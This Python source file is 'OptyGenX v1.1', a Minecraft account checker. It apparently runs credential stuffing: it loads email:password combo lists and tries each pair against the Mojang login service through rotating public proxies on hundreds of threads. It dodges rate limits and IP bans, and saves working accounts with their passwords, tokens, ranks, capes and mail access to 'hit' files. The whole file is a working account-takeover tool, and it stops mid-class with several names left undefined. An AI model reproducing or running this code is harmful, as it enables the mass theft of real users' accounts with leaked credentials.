from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta, timezone
from multiprocessing.dummy import Pool as ThreadPool
from os import mkdir, path, system, name
import os
from random import choice
from re import compile
from threading import Thread, Lock
from time import sleep, strftime, time, gmtime
from traceback import format_exc
from licensing.models import *
import urllib.request
from socket import socket
import pandas as pd
from licensing.methods import Key, Helpers
from cloudscraper import create_scraper
from colorama import init, Fore, Style
from console.utils import set_title
from easygui import fileopenbox
from requests import Session, exceptions
from yaml import safe_load
import random
os.system(f'cls')
version = '1.1'
print(Fore.CYAN + "Starting Script...")
print(Fore.CYAN + "OptyGenX v" + str(version) + " by l3m0n")
print(Fore.CYAN + "--")
urlsession1 = "https://raw.githubusercontent.com/L3M0NFLUX/script/master/announceline1"
urlsession2 = "https://raw.githubusercontent.com/L3M0NFLUX/script/master/announceline2"
urlsession3 = "https://raw.githubusercontent.com/L3M0NFLUX/script/master/announceline3"
latestver = "https://raw.githubusercontent.com/L3M0NFLUX/script/master/latestversion"
announceline1 = urllib.request.urlopen(urlsession1).read()
announceline2 = urllib.request.urlopen(urlsession2).read()
announceline3 = urllib.request.urlopen(urlsession3).read()
latestversion = urllib.request.urlopen(latestver).read()
announceline1 = str(announceline1)
announceline2 = str(announceline2)
announceline3 = str(announceline3)
latestversion = str(latestversion)
announceline1 = announceline1[2:]
announceline2 = announceline2[2:]
announceline3 = announceline3[2:]
anc1length = len(announceline1)
anc2length = len(announceline2)
anc3length = len(announceline3)
anc1length = int(anc1length)
anc2length = int(anc2length)
anc3length = int(anc3length)
anc1length = anc1length - 3
anc2length = anc2length - 3
anc3length = anc3length - 3
announceline1 = announceline1[:anc1length]
announceline2 = announceline2[:anc2length]
announceline3 = announceline3[:anc3length]
latestversion = latestversion[2:]
latestversion = latestversion[:3]
latestversion = float(latestversion)
if (float(version) == float(latestversion)):
    set_title(f'OptygenX-{version} | by l3m0n')
    os.system(f'cls')
    print(Fore.WHITE + "====================================================================")
    print(Style.BRIGHT)
    print("")
    print(Fore.CYAN + "░█████╗░██████╗░████████╗██╗░░░██╗░██████╗░███████╗███╗░░██╗██╗░░██╗")
    print(Fore.CYAN + "██╔══██╗██╔══██╗╚══██╔══╝╚██╗░██╔╝██╔════╝░██╔════╝████╗░██║╚██╗██╔╝")
    print(Fore.CYAN + "██║░░██║██████╔╝░░░██║░░░░╚████╔╝░██║░░██╗░█████╗░░██╔██╗██║░╚███╔╝░")
    print(Fore.CYAN + "██║░░██║██╔═══╝░░░░██║░░░░░╚██╔╝░░██║░░╚██╗██╔══╝░░██║╚████║░██╔██╗░")
    print(Fore.CYAN + "╚█████╔╝██║░░░░░░░░██║░░░░░░██║░░░╚██████╔╝███████╗██║░╚███║██╔╝╚██╗")
    print(Fore.CYAN + "░╚════╝░╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░░╚═════╝░╚══════╝╚═╝░░╚══╝╚═╝░░╚═╝")
    print("")
    print(Fore.CYAN + "v" + str(version) + " by l3m0n")
    print(Fore.WHITE + "==================================================================== ")
    print(Style.BRIGHT)
    print(Fore.YELLOW + "                       <!> Announcements <!>")
else:
    if (float(version) > float(latestversion)):
        set_title(f'OptygenX-{version} | Too far updated..? | by l3m0n')
        os.system(f'cls')
        print(Fore.WHITE + "====================================================================")
        print(Style.BRIGHT)
        print("")
        print(Fore.BLUE + "░█████╗░██████╗░████████╗██╗░░░██╗░██████╗░███████╗███╗░░██╗██╗░░██╗")
        print(Fore.BLUE + "██╔══██╗██╔══██╗╚══██╔══╝╚██╗░██╔╝██╔════╝░██╔════╝████╗░██║╚██╗██╔╝")
        print(Fore.BLUE + "██║░░██║██████╔╝░░░██║░░░░╚████╔╝░██║░░██╗░█████╗░░██╔██╗██║░╚███╔╝░")
        print(Fore.BLUE + "██║░░██║██╔═══╝░░░░██║░░░░░╚██╔╝░░██║░░╚██╗██╔══╝░░██║╚████║░██╔██╗░")
        print(Fore.BLUE + "╚█████╔╝██║░░░░░░░░██║░░░░░░██║░░░╚██████╔╝███████╗██║░╚███║██╔╝╚██╗")
        print(Fore.BLUE + "░╚════╝░╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░░╚═════╝░╚══════╝╚═╝░░╚══╝╚═╝░░╚═╝")
        print("")
        print(Fore.BLUE + "v" + str(version) + " by l3m0n")
        print(Fore.WHITE + "==================================================================== ")
        print(Style.BRIGHT)
        print(Fore.BLUE + "                       <!> Announcements <!>")
    else:
        set_title(f'OptygenX-{version} | OUTDATED!! | by l3m0n')
        os.system(f'cls')
        print(Fore.WHITE + "====================================================================")
        print(Style.BRIGHT)
        print("")
        print(Fore.RED + "░█████╗░██████╗░████████╗██╗░░░██╗░██████╗░███████╗███╗░░██╗██╗░░██╗")
        print(Fore.RED + "██╔══██╗██╔══██╗╚══██╔══╝╚██╗░██╔╝██╔════╝░██╔════╝████╗░██║╚██╗██╔╝")
        print(Fore.RED + "██║░░██║██████╔╝░░░██║░░░░╚████╔╝░██║░░██╗░█████╗░░██╔██╗██║░╚███╔╝░")
        print(Fore.RED + "██║░░██║██╔═══╝░░░░██║░░░░░╚██╔╝░░██║░░╚██╗██╔══╝░░██║╚████║░██╔██╗░")
        print(Fore.RED + "╚█████╔╝██║░░░░░░░░██║░░░░░░██║░░░╚██████╔╝███████╗██║░╚███║██╔╝╚██╗")
        print(Fore.RED + "░╚════╝░╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░░╚═════╝░╚══════╝╚═╝░░╚══╝╚═╝░░╚═╝")
        print("")
        print(Fore.RED + "v" + str(version) + " by l3m0n")
        print(Fore.WHITE + "==================================================================== ")
        print(Style.BRIGHT)
        print(Fore.RED + "                       <!> Announcements <!>")
print(Fore.WHITE + "<!>--------------------------------------------------------------<!>")
if (float(version) == float(latestversion)):
    print(Fore.YELLOW + "- Your OptyGenX, (" + Fore.GREEN + "v" + str(version) + Fore.YELLOW + ") is up to date!")
    print(Fore.YELLOW + announceline1)
    print(Fore.YELLOW + announceline2)
    print(Fore.YELLOW + announceline3)
    print(Fore.WHITE + "<!>--------------------------------------------------------------<!>")
else:
    if (float(version) > float(latestversion)):
        print(Fore.BLUE + "Uh oh! Your OptyGenX version (" + Fore.CYAN + "v" + str(version) + Fore.BLUE + ") is... Too far updated..?")
        print(Fore.BLUE + "You somehow managed to get an OptyGenX version NEWER than the released one.")
        print(Fore.BLUE + "I'm assuming this is a developer build, and was given to you by someone.")
        print(Fore.BLUE + "You can still run the script, but don't blame us for any bugs.")
        print(Fore.BLUE + "If you wish to use the latest stable version " + "(" + Fore.GREEN + "v" + str(latestversion) + Fore.BLUE + ") " + "please download it below;")
        print(Fore.BLUE + "Link: " + Fore.BLUE + "http://www.mediafire.com/file/cnm4zfex4qa1uo7/OptygenX_by_l3m0n.zip/file")
        print(Fore.WHITE + "<!>--------------------------------------------------------------<!>")
    else:
        print(Fore.RED + "Uh oh! Your OptyGenX version (" + Fore.RED + "v" + str(version) + Fore.RED + ") is outdated!")
        print(Fore.RED + "You cannot use OptyGenX until you update to the latest version (" + Fore.GREEN + "v" + str(latestversion) + Fore.RED + ").")
        print(Fore.RED + "Please install your update now!")
        print(Fore.RED + "Link: " + Fore.BLUE + "http://www.mediafire.com/file/cnm4zfex4qa1uo7/OptygenX_by_l3m0n.zip/file")
        print(Fore.WHITE + "<!>--------------------------------------------------------------<!>")
        print("")
        kdfgd=input("Press enter key to exit...")
        exit()
print(Style.BRIGHT)
kdfgd=input("Press enter key to begin...")
os.system(f'cls')
default_values = '''#░█████╗░██████╗░████████╗██╗░░░██╗░██████╗░███████╗███╗░░██╗██╗░░██╗
#██╔══██╗██╔══██╗╚══██╔══╝╚██╗░██╔╝██╔════╝░██╔════╝████╗░██║╚██╗██╔╝
#██║░░██║██████╔╝░░░██║░░░░╚████╔╝░██║░░██╗░█████╗░░██╔██╗██║░╚███╔╝░
#██║░░██║██╔═══╝░░░░██║░░░░░╚██╔╝░░██║░░╚██╗██╔══╝░░██║╚████║░██╔██╗░
#╚█████╔╝██║░░░░░░░░██║░░░░░░██║░░░╚██████╔╝███████╗██║░╚███║██╔╝╚██╗
#░╚════╝░╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░░╚═════╝░╚══════╝╚═╝░░╚══╝╚═╝░░╚═╝
#
#                   - Created and coded by l3m0n#0001
#                   - Code cleaned and revised by MohanadHosny#9152
#                   - Bugs patched and key system by Side#6776
#                   - Settings file for OptygenX-1.1

OptyGenX:

  # DO NOT CHANGE TO TRUE!!! AUTO UPDATES ARE DISCONTINUED
  check_for_updates: false

  # Amount of checks for a account many times to check a account. will be slower if retries is set higher
  # Needs to be 1 or higher (Recommanded: 1-2 for paid proxies, 3-6 for public proxies.)
  retries: 3

  # Higher for better accuracy but slower (counted in milliseconds, example: 5000ms = 5 seconds)
  timeout: 4000

  # Threads for account checking
  threads: 300
  
  # Remove all duplicates in combolist
  combo_duplicates: true
  
  # Remove all duplicates in proxylist/api
  proxy_duplicates: true
  
  # Check hits if its a mail access
  mail_access: true
  
  # Save ranked accounts in NFA.txt or SFA.txt (Turn it off for ranked accounts NOT to save in NFA.txt or SFA.txt)
  save_ranked_type: true
  
  # Print bad accounts
  print_bad: true
  
  # Save bad accounts
  save_bad: true

  # DO NOT CHANGE TO TRUE!!! DEBUGGING IS BROKEN
  debugging: false
  
  
  capes:
    # Check capes
    liquidbounce: true
    optifine: true
    labymod:  true
    mojang:  true

  rank:
  # Set true if you want to check the ranks/level
    mineplex: true
    hypixel:  true
    hivemc: true
    veltpvp: true

  level:
    # Save High leveled accounts in files.
    hypixel: true
    mineplex: true
    
    # Minimum high level accounts
    hypixel_level: 25
    mineplex_level: 25

  proxy:
    # DO NOT CHANGE TO FALSE!!! PROXYLESS DOES NOT WORK
    proxy: true
    # Proxy types: https | socks4 | socks5
    proxy_type: 'socks4'
    # EXPERMENTAL! Still in testing stage, may have problems
    # Locks the proxy so other threads can't use it
    lock_proxy: false
    # EXPERMENTAL! Still in testing stage, may have problems
    # Auto remove proxies (you can limit the proxies removed with proxy_remove_limit)
    remove_bad_proxy: false
    # EXPERMENTAL! Still in testing stage, may have problems
    # If remove bad proxies are on, once the proxy list hits the limit it will stop removing bad proxies
    proxy_remove_limit: 2000
    # If proxies be used for checking sfas (Will be slower but if false, you may get ip banned)
    proxy_for_sfa: false
    # Sleep between checks if proxy mode is false (put 0 for no sleep) counted in secouds
    sleep_proxyless: 30
    
    api:
      # TOGGLE TRUE/FALSE TO DISABLE/ENABLE AUTO PROXIES
      use: true
      # If proxy_use_api is true, put api link in the parentheses
      api_link: "https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=3000"
      # If proxy_use_api is true, put a number for seconds to refresh the link (every number under 30 is for no refreshing time, recommend refresh time: 300 seconds aka 5 minutes)
      refresh_time: 300
'''

if path.exists('Settings.yml'):
    settings = safe_load(open('Settings.yml', 'r', errors='ignore', encoding='utf-8'))
else:
    open('Settings.yml', 'w').write(default_values)
    settings = safe_load(open('Settings.yml', 'r', errors='ignore', encoding='utf-8'))


class Counter:
    nfa = 0
    error = 0
    sfa = 0
    unfa = 0
    demo = 0
    hits = 0
    bad = 0
    optifine = 0
    mojang = 0
    labymod = 0
    liquidbounce = 0
    special_name = 0
    hivemcrank = 0
    mineplexrank = 0
    mineplexhl = 0
    hypixelrank = 0
    hypixelhl = 0
    hivelevel = 0
    mfa = 0
    nohypixel = 0
    nomineplex = 0
    veltrank = 0
    checked = 0
    cpm = 0
    legacy_name = 0


class Main:
    def __init__(self):
        self.stop_time = True
        self.start_time = 0
        self.accounts = []
        self.proxylist = []
        self.folder = ''
        self.unmigrated = False
        if OptyGenX.Cape.lb:
            self.lbcape = str(self.liquidbounce())
        print(Fore.WHITE + "====================================================================")
        print(Style.BRIGHT)
        print("")
        print(Fore.CYAN + "░█████╗░██████╗░████████╗██╗░░░██╗░██████╗░███████╗███╗░░██╗██╗░░██╗")
        print(Fore.CYAN + "██╔══██╗██╔══██╗╚══██╔══╝╚██╗░██╔╝██╔════╝░██╔════╝████╗░██║╚██╗██╔╝")
        print(Fore.CYAN + "██║░░██║██████╔╝░░░██║░░░░╚████╔╝░██║░░██╗░█████╗░░██╔██╗██║░╚███╔╝░")
        print(Fore.CYAN + "██║░░██║██╔═══╝░░░░██║░░░░░╚██╔╝░░██║░░╚██╗██╔══╝░░██║╚████║░██╔██╗░")
        print(Fore.CYAN + "╚█████╔╝██║░░░░░░░░██║░░░░░░██║░░░╚██████╔╝███████╗██║░╚███║██╔╝╚██╗")
        print(Fore.CYAN + "░╚════╝░╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░░╚═════╝░╚══════╝╚═╝░░╚══╝╚═╝░░╚═╝")
        print("")
        print(Fore.CYAN + "v" + str(version) + " by l3m0n")
        print(Fore.WHITE + "==================================================================== ")
        print(f'{red}[!] Please remember to configure your settings file before using OptygenX\n')
        print(f'{cyan}[Mode] Choose checker mode\n'
              '[>] 1 Start Checker\n'
              '[>] 2 Close Checker')
        mode = input('> ')
        if mode == '2':
            print("\n" + Fore.GREEN + "See you next time...")
            time.sleep(3)
            exit()
        else:
            pass
            print('\nSelected Start Checker')
        self.loadcombo()
        self.loadproxy()
        self.resultfolder()
        print(f'\n{cyan}Starting Threads...')
        Thread(target=self.cpm_counter, daemon=True).start()
        self.start_checker()
        print(f'[{red}Exit{white}] You can now close OptygenX...\n')
        input()
        exit()

    def prep(self, line):
        if ':' in line:
            try:
                email, password = line.split(':', 1)
                original_line = line
                original_email = email
                if self.unmigrated:
                    if '@' in email:
                        email = email.split('@')[0]
                        if not any(x in email for x in charz):
                            line = f'{email}:{password}'
                        else:
                            Counter.checked += 1
                            Counter.bad += 1
                            self.prints(f'{red}[Badline] {blue}- {red}{line}')
                            self.writing([line, 'Badline'])
                            return
                        reply = self.checkname(email)
                        if not reply:
                            Counter.checked += 1
                            Counter.bad += 1
                            if OptyGenX.print_bad:
                                self.prints(f'{red}[Bad] {blue}- {red}{line}')
                            if OptyGenX.save_bad:
                                self.writing([line, 'Bad'])
                            return
                        else:
                            Counter.legacy_name += 1
                    else:
                        pass
                answer = self.checkmc(user=email, passw=password)
                Counter.checked += 1
                if 'Invalid credentials' in answer:
                    Counter.bad += 1
                    if OptyGenX.print_bad:
                        self.prints(f'{red}[Bad] {blue}- {red}{line}')
                    if OptyGenX.save_bad:
                        self.writing([line, 'Bad'])
                    return
                texta = answer.text
                if '[]' in texta:
                    self.prints(f'{yellow}[Demo] {blue}- {yellow}{line}')
                    Counter.demo += 1
                    self.writing([line, 'Demo'])
                    return
                else:
                    ajson = answer.json()
                    uuid = ajson['availableProfiles'][0]["id"]
                    username = ajson['availableProfiles'][0]['name']
                    self.writing([line, 'Hits'])
                    token = ajson['accessToken']
                    dosfa = True
                    sfa = False
                    saveranked = True
                    if self.unmigrated:
                        data = ['=======================================\n'
                                f'Original Combo: {original_line}\n'
                                f'Unmigrated Combo: {line}\n'
                                f'Username: {username}\n'
                                f'UUID: {uuid}\n'
                                f'Email?: {original_email}\n'
                                f'Password: {password}']
                    else:
                        data = ['=======================================\n'
                                f'Original Combo: {line}\n'
                                f'Username: {username}\n'
                                f'UUID: {uuid}\n'
                                f'Email: {email}\n'
                                f'Password: {password}']

                    if "legacy': True" in str(ajson) or (
                            self.unmigrated and "legacy': True" in str(ajson)):
                        Counter.unfa += 1
                        self.prints(f'{magenta}[Unmigrated]{blue} - {green}{line}')
                        self.writing([line, 'Unmigrated'])
                        data.append('\nUnmigrated: True')
                        dosfa = False

                    if dosfa or not self.unmigrated:
                        securec = self.secure_check(token=token)
                        if securec:
                            Counter.sfa += 1
                            self.prints(f'{cyan}[SFA]{blue} - {green}{line}{blue} | {green}Username: {username}')
                            sfa = True
                            data.append('\nSFA: True')
                        else:
                            Counter.nfa += 1
                            self.prints(f'{green}[NFA]{blue} - {green}{line}{blue} | {green}Username: {username}')
                    Counter.hits += 1

                    if len(username) <= 3 or any(x in username for x in charz):
                        Counter.special_name += 1
                        self.writing([f'{line} | Username: {username}', 'SpecialName'])
                        data.append('\nSpecial Name: True')

                    with ThreadPoolExecutor(max_workers=9) as exe:
                        hypixel = exe.submit(self.hypixel, uuid, line).result()
                        mineplex = exe.submit(self.mineplex, username, line).result()
                        hiverank = exe.submit(self.hivemc, uuid, line).result()
                        mailaccess = exe.submit(self.mailaccess, original_line).result()
                        veltrank = exe.submit(self.veltpvp, username, line).result()
                        mojang = exe.submit(self.mojang, uuid, line, username).result()
                        optifine = exe.submit(self.optifine, username, line).result()
                        labycape = exe.submit(self.labymod, uuid, line, username).result()
                        skyblock = exe.submit(self.skyblock, uuid).result()
                    try:
                        if mojang:
                            data.append('\nMojang Cape: True')

                        if optifine:
                            data.append('\nOptifine Cape: True')

                        if labycape:
                            data.append('\nLabymod Cape: True')

                        if OptyGenX.Cape.lb:
                            if uuid in self.lbcape:
                                Counter.liquidbounce += 1
                                self.writing([f'{line} | Username: {username}', 'LiquidBounceCape'])
                                data.append('\nLiquidBounce Cape: True')

                        if dosfa:
                            if mailaccess:
                                data.append('\nMFA: True')

                        if veltrank:
                            if not OptyGenX.ranktype:
                                saveranked = False
                            data.append(f'\nVelt Rank: {veltrank}')

                        if hiverank:
                            data.append(f'\nHive Rank: {str(hiverank)}')
                            if not OptyGenX.ranktype:
                                saveranked = False

                        if OptyGenX.Rank.mineplex or OptyGenX.Level.mineplex:
                            if mineplex[0]:
                                data.append(f'\nMineplex Rank: {mineplex[0]}')
                                if not OptyGenX.ranktype:
                                    saveranked = False
                            if mineplex[1]:
                                data.append(f'\nMineplex Level: {str(mineplex[1])}')
                            if not mineplex[0] and not mineplex[1]:
                                data.append(f'\nNo Mineplex Login: True')

                        if OptyGenX.Rank.hypixel or OptyGenX.Level.hypixel:
                            if not hypixel[2]:
                                if str(hypixel[0]) not in ['None', 'False']:
                                    if not OptyGenX.ranktype:
                                        saveranked = False
                                    data.append(f'\nHypixel Rank: {hypixel[0]}')
                                if hypixel[1]:
                                    data.append(f'\nHypixel Level: {str(hypixel[1])}')
                                if hypixel[3]:
                                    data.append(f'\nHypixel LastLogout Date: {hypixel[3]}')
                                if hypixel[4] != 0:
                                    data.append(f'\nHypixel SkyWars Coins: {str(hypixel[4])}')
                                if hypixel[5] != 0:
                                    data.append(f'\nHypixel BedWars Level: {str(hypixel[5])}')
                                if hypixel[6] != 0:
                                    data.append(f'\nHypixel BedWars Coins: {str(hypixel[6])}')
                                if skyblock:
                                    data.append(f'\nHypixel SkyBlock Stats: https://sky.lea.moe/stats/{uuid}')
                            else:
                                data.append(f'\nNo Hypixel Login: True')
                    except:
                        if OptyGenX.debug:
                            self.prints(f'{red}[Error] {line} \nRank/Cape Check Error: {format_exc(limit=1)}')
                    if saveranked and dosfa:
                        if sfa:
                            self.writing([line, 'SFA'])
                        else:
                            self.writing([line, 'NFA'])

                    self.writing([''.join(data), 'CaptureData'])
                    return
            except:
                if OptyGenX.debug:
                    self.prints(f'{red}[Error] {line} \nError: {format_exc(limit=1)}')
                self.writing([line, 'Error'])
                Counter.error += 1
                return
        else:
            Counter.checked += 1
            Counter.bad += 1
            self.prints(f'{red}[Badline] {line}')
            self.writing([line, 'Badlines'])
            return

    def checkmc(self, user, passw, ):
        payload = ({
            'agent': {
                'name': 'Minecraft',
                'version': 1
            },
            'username': user,
            'password': passw,
            'requestUser': 'true'
        })
        bad = 'Invalid credentials'
        retries = 0
        if not OptyGenX.Proxy.proxy:
            while True:
                if retries != OptyGenX.retries:
                    try:
                        answer = session.post(url=auth_mc, json=payload, headers=jsonheaders,
                                              timeout=OptyGenX.timeout)
                        if bad in answer.text:
                            retries += 1
                            sleep(OptyGenX.Proxy.sleep)
                            continue
                        elif 'Client sent too many requests too fast.' in answer.text:
                            sleep(5)
                            continue
                        else:
                            return answer
                    except:
                        if OptyGenX.debug:
                            self.prints(f'CheckMC ProxyLess: \n{format_exc(limit=1)}')
                        continue
                else:
                    return bad
        else:
            while True:
                if retries != OptyGenX.retries:
                    proxy_form = {}
                    proxy = choice(self.proxylist)
                    if proxy.count(':') == 3:
                        spl = proxy.split(':')
                        proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
                    else:
                        proxy = proxy
                    locked = OptyGenX.Proxy.lock_proxy
                    if proxy in ['', '\n']:
                        try:
                            self.proxylist.remove(proxy)
                            continue
                        except:
                            pass
                    if locked:
                        try:
                            self.proxylist.remove(proxy)
                        except:
                            locked = False
                    if OptyGenX.Proxy.type in ['https', 'http']:
                        proxy_form = {'http': f"http://{proxy}", 'https': f"https://{proxy}"}
                    elif OptyGenX.Proxy.type in ['socks4', 'socks5']:
                        line = f"{OptyGenX.Proxy.type}://{proxy}"
                        proxy_form = {'http': line, 'https': line}
                    try:
                        answer = scraper.post(url=auth_mc, proxies=proxy_form, json=payload, headers=jsonheaders,
                                              timeout=OptyGenX.timeout)
                        if locked:
                            self.proxylist.append(proxy)
                        if bad in answer.text:
                            retries += 1
                            continue
                        elif answer.headers.get("Content-Type").__contains__("html"):
                            if OptyGenX.Proxy.remove_bad_proxy and len(
                                    self.proxylist) >= OptyGenX.proxy_remove_limit:
                                if not locked:
                                    try:
                                        self.proxylist.remove(proxy)
                                    except:
                                        pass
                            continue
                        else:
                            return answer
                    except exceptions.RequestException:
                        if OptyGenX.Proxy.remove_bad_proxy and len(self.proxylist) >= OptyGenX.Proxy.proxy_remove_limit:
                            if not locked:
                                try:
                                    self.proxylist.remove(proxy)
                                except:
                                    pass
                        elif locked:
                            self.proxylist.append(proxy)
                    except:
                        if locked:
                            self.proxylist.append(proxy)
                        if OptyGenX.debug:
                            self.prints(f'CheckMC: \n{format_exc(limit=1)}')
                        continue
                else:
                    return bad

    def secure_check(self, token):
        headers = {'Pragma': 'no-cache', "Authorization": f"Bearer {token}"}
        try:
            if not OptyGenX.Proxy.proxy or not OptyGenX.Proxy.sfa_proxy:
                try:
                    z = session.get(url=sfa_url, headers=headers).text
                    if z == '[]':
                        return True
                    else:
                        return False
                except:
                    if OptyGenX.debug:
                        self.prints(f'ErrorSFA ProxyLess: \n{format_exc(limit=1)}')
                    return False
            else:
                while True:
                    proxy_form = {}
                    proxy = choice(self.proxylist)
                    if proxy.count(':') == 3:
                        spl = proxy.split(':')
                        proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
                    else:
                        proxy = proxy
                    if proxy in ['', '\n']:
                        try:
                            self.proxylist.remove(proxy)
                            continue
                        except:
                            pass
                    if OptyGenX.Proxy.type == 'http' or OptyGenX.Proxy.type == 'https':
                        proxy_form = {'http': f"http://{proxy}", 'https': f"https://{proxy}"}
                    elif OptyGenX.Proxy.type == 'socks4' or OptyGenX.Proxy.type == 'socks5':
                        line = f"{OptyGenX.Proxy.type}://{proxy}"
                        proxy_form = {'http': line, 'https': line}
                    try:
                        resp = session.get(url=sfa_url, headers=headers, proxies=proxy_form).text
                        if 'request blocked' in resp.lower():
                            continue
                        elif resp == '[]':
                            return True
                        else:
                            return False
                    except exceptions.RequestException:
                        if OptyGenX.Proxy.remove_bad_proxy and len(self.proxylist) >= OptyGenX.Proxy.proxy_remove_limit:
                            try:
                                self.proxylist.remove(proxy)
                            except:
                                pass
                        continue
        except:
            if OptyGenX.debug:
                self.prints(f'Error SFA: \n{format_exc(limit=1)}')
            return False

    def checkname(self, username):
        try:
            if OptyGenX.Proxy.proxy:
                while True:
                    proxy_form = {}
                    proxy = choice(self.proxylist)
                    if proxy.count(':') == 3:
                        spl = proxy.split(':')
                        proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
                    else:
                        proxy = proxy
                    if OptyGenX.Proxy.type == 'http' or OptyGenX.Proxy.type == 'https':
                        proxy_form = {'http': f"http://{proxy}", 'https': f"https://{proxy}"}
                    elif OptyGenX.Proxy.type == 'socks4' or OptyGenX.Proxy.type == 'socks5':
                        line = f"{OptyGenX.Proxy.type}://{proxy}"
                        proxy_form = {'http': line, 'https': line}
                    try:
                        answer = scraper.post(url=user_url, json=[username], proxies=proxy_form, headers=mailheaders,
                                              timeout=OptyGenX.timeout).text
                        if 'The request could not be satisfied' in answer:
                            continue
                        elif 'legacy":true' in answer:
                            return True
                        else:
                            return False
                    except exceptions.RequestException:
                        if OptyGenX.Proxy.remove_bad_proxy and len(self.proxylist) >= OptyGenX.Proxy.proxy_remove_limit:
                            try:
                                self.proxylist.remove(proxy)
                            except:
                                pass
                        continue
            else:
                try:
                    sleep(OptyGenX.Proxy.sleep)
                    answer = scraper.post(url=user_url, json=[username], headers=mailheaders,
                                          timeout=OptyGenX.timeout).text
                    if 'legacy":true' in answer:
                        return True
                    else:
                        return False
                except:
                    if OptyGenX.debug:
                        self.prints(f'{red}[Error Check] {format_exc(limit=1)}')
                    return False
        except:
            if OptyGenX.debug:
                self.prints(f'{red}[Error Check] {format_exc(limit=1)}')
            return False

    def title(self):
        while self.stop_time:
            if not self.unmigrated:
                set_title(
                    f"OptygenX-{version}"
                    f" | Hits: {Counter.hits}"
                    f" - Bad: {Counter.bad}"
                    f'{"" if Counter.nfa == 0 else f" - NFA: {Counter.nfa}"}'
                    f'{"" if Counter.sfa == 0 else f" - SFA: {Counter.sfa}"}'
                    f'{"" if Counter.unfa == 0 else f" - Unmigrated: {Counter.unfa}"}'
                    f'{"" if Counter.demo == 0 else f" - Demo: {Counter.demo}"}'
                    f"{'' if Counter.mfa == 0 else f' - MFA: {Counter.mfa}'}"
                    f"{'' if Counter.error == 0 else f' | Errors: {Counter.error}'}"
                    f" | Left: {len(self.accounts) - Counter.checked}/{len(self.accounts)}"
                    f'{"" if not OptyGenX.Proxy.proxy else f" - Proxies: {len(self.proxylist)}"}'
                    f' | CPM: {Counter.cpm}'
                    f' | Checker Working')
            else:
                set_title(
                    f"OptygenX-{version} | "
                    f"Hits: {Counter.hits}"
                    f" - Bad: {Counter.bad}"
                    f'{"" if Counter.legacy_name == 0 else f" - Legacy Lines: {Counter.legacy_name}"}'
                    f'{"" if Counter.unfa == 0 else f" - Unmigrated: {Counter.unfa}"}'
                    f"{'' if Counter.error == 0 else f' | Errors: {Counter.error}'}"
                    f" | Left: {len(self.accounts) - Counter.checked}/{len(self.accounts)}"
                    f'{"" if not OptyGenX.Proxy.proxy else f" - Proxies: {len(self.proxylist)}"}'
                    f' | CPM: {Counter.cpm}'
                    f' | Checker Working | Unmigrated Checker')

    def prints(self, line):
        lock.acquire()
        print(f'{blue} {line}')
        lock.release()

    def writing(self, line):
        lock.acquire()
        open(f'{self.folder}/{line[1]}.txt', 'a', encoding='u8').write(f'{line[0]}\n')
        lock.release()

    def optifine(self, user, combo):
        cape = False
        if OptyGenX.Cape.optifine:
            try:
                optifine = session.get(url=f'http://s.optifine.net/capes/{user}.png').text
                if 'Not found' not in optifine:
                    cape = True
                    Counter.optifine += 1
                    self.writing([f'{combo} | Username: {user}', 'OptifineCape'])
                return cape
            except:
                if OptyGenX.debug:
                    self.prints(f'{red}Error Optifine:\n{format_exc(limit=1)}')
        return cape

    def mojang(self, uuid, combo, user):
        cape = False
        if OptyGenX.Cape.mojang:
            try:
                mine = session.get(url=f'https://crafatar.com/capes/{uuid}', headers=mailheaders).text.lower()
                if 'png' in mine:
                    cape = True
                    Counter.mojang += 1
                    self.writing([f'{combo} | Username: {user}', 'MojangCape'])
                return cape
            except:
                if OptyGenX.debug:
                    self.prints(f'{red}Error MojangCape:\n{format_exc(limit=1)}')
        return cape

    def labymod(self, uuid, combo, user):
        cape = False
        if OptyGenX.Cape.laby:
            link = f'https://capes.labymod.net/capes/{uuid[:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:20]}-{uuid[20:]}'
            try:
                laby = session.get(url=link, headers=mailheaders).text
                if 'Not Found' not in laby:
                    cape = True
                    Counter.labymod += 1
                    self.writing([f'{combo} | Username: {user}', 'LabymodCape'])
            except:
                if OptyGenX.debug:
                    self.prints(f'{red}Error Labymod:\n{format_exc(limit=1)}')
        return cape

    def liquidbounce(self):
        try:
            lbc = session.get(
                url='https://raw.githubusercontent.com/CCBlueX/FileCloud/master/LiquidBounce/cape/service.json',
                headers=mailheaders).text
            return lbc
        except:
            if OptyGenX.debug:
                self.prints(f'{red}Error LiquidBounce:\n{format_exc(limit=1)}')
            return False

    def hivemc(self, uuid, combo):
        rank = False
        if OptyGenX.Rank.hivemc:
            try:
                response = session.get(url=f'https://www.hivemc.com/player/{uuid}', headers=mailheaders).text
                match = rankhv.search(response).group(1)
                if match != 'Regular':
                    rank = match
            except AttributeError:
                rank = False
            except:
                if OptyGenX.debug:
                    self.prints(f'{red}Error HiveMC:\n{format_exc(limit=1)}')
            if rank:
                self.writing([f'{combo} | Rank: {str(rank)}', 'HiveRanked'])
                Counter.hivemcrank += 1
            return rank

    def mineplex(self, username, combo):
        both = [False, False]
        if OptyGenX.Rank.mineplex or OptyGenX.Level.mineplex:
            try:
                response = session.get(url=f'https://www.mineplex.com/players/{username}',
                                       headers=mailheaders).text
                if 'That player cannot be found.' in response:
                    both[0] = False
                    both[1] = False
                else:
                    both[0] = str(rankmp.search(response).group(1))
                    both[1] = int(levelmp.search(response).group(1))
                    if both[0].lower() == '':
                        both[0] = False
            except:
                if OptyGenX.debug:
                    self.prints(f'{red}Error Mineplex:\n{format_exc(limit=1)}')
            if both[0]:
                Counter.mineplexrank += 1
                self.writing([f'{combo} | Rank: {both[0]}', 'MineplexRanked'])
            if both[1] and OptyGenX.Rank.mineplex:
                if both[1] >= OptyGenX.Level.mineplex_level:
                    Counter.mineplexhl += 1
                    self.writing([f'{combo} | Level: {str(both[1])}', 'MineplexHighLevel'])
            if not both[0] and not both[1]:
                Counter.nomineplex += 1
                self.writing([combo, 'NoMineplexLogin'])
